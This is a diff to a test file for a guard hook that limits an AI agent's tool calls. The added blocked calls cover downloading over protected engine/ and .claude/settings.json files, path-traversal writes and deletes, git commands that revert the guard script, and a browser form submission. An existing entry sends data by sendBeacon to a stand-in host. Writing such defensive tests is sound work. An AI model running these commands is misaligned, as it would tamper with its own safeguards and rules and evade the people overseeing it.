@@ -79,6 +79,21 @@ BLOCKED_CALLS = [
     ("mcp__obscura__browser_evaluate", {"expression": "location.href = 'https://x.example.com/'"}, "only read"),
     ("mcp__Claude_Browser__javascript_tool", {"text": "navigator.sendBeacon('https://x.example.com', d)"}, "read"),
     ("mcp__Claude_Browser__computer", {"action": "type", "text": "hello"}, "typing"),
+    ("Bash", {"command": "curl -s https://api.ashbyhq.com/x -o engine/tools/extract.py"}, "engine/"),
+    ("Bash", {"command": "wget -q -O engine/RULES.md https://api.ashbyhq.com/x"}, "engine/"),
+    ("PowerShell", {"command": "Invoke-WebRequest -Uri https://api.ashbyhq.com/x -OutFile .claude/settings.json"},
+     ".claude/"),
+    ("Write", {"file_path": "\\\\?\\{root}/engine/tools/x.py", "content": "x"}, "engine/ is read-only"),
+    ("Bash", {"command": "echo x >| engine/a.txt"}, "writes into engine/"),
+    ("PowerShell", {"command": "sc engine/RULES.md 'x'"}, "changes engine/"),
+    ("PowerShell", {"command": "ri .claude/settings.json"}, "changes .claude/"),
+    ("Bash", {"command": "cp notes.txt applications/../engine/tools/x.py"}, "engine/"),
+    ("Bash", {"command": "rm applications/../engine/RULES.md"}, "engine/"),
+    ("Bash", {"command": "git -C engine checkout HEAD~5 -- tools/hooks/guard.py"}, "engine/"),
+    ("Bash", {"command": "git -C engine reset --hard HEAD~1"}, "engine/"),
+    ("Bash", {"command": "git -C engine stash"}, "engine/"),
+    ("Bash", {"command": "python engine/tools/../../notes.py"}, "engine/tools"),
+    ("mcp__obscura__browser_evaluate", {"expression": "document.forms[0].requestSubmit()"}, "only read the page"),
 ]
 
 
@@ -126,6 +141,12 @@ ALLOWED_CALLS = [
     ("mcp__claude_ai_Gmail__search_threads", {"query": "Bewerbung newer_than:1d"}),
     ("Agent", {"prompt": "never write to engine/ or send email; read the ad", "subagent_type": "general-purpose"}),
     ("Read", {"file_path": "engine/RULES.md"}),
+    ("Bash", {"command": "git -C engine show origin/main:UPGRADING.md"}),
+    ("Bash", {"command": "git -C engine worktree remove --force ../engine-new"}),
+    ("Bash", {"command": "git -C engine log --oneline -5 && git -C engine status --short"}),
+    ("Bash", {"command": "curl -s https://api.ashbyhq.com/posting-api/job-board/deepl -o data/ashby.json"}),
+    ("Bash", {"command": "cp engine/templates/application_template.md applications/../applications/X/application.md"}),
+    ("PowerShell", {"command": "Get-Content engine/RULES.md | Select-Object -First 5"}),
 ]
 
 
